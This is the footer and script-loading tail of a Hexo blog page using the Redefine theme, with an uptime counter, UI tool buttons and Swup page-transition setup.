        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
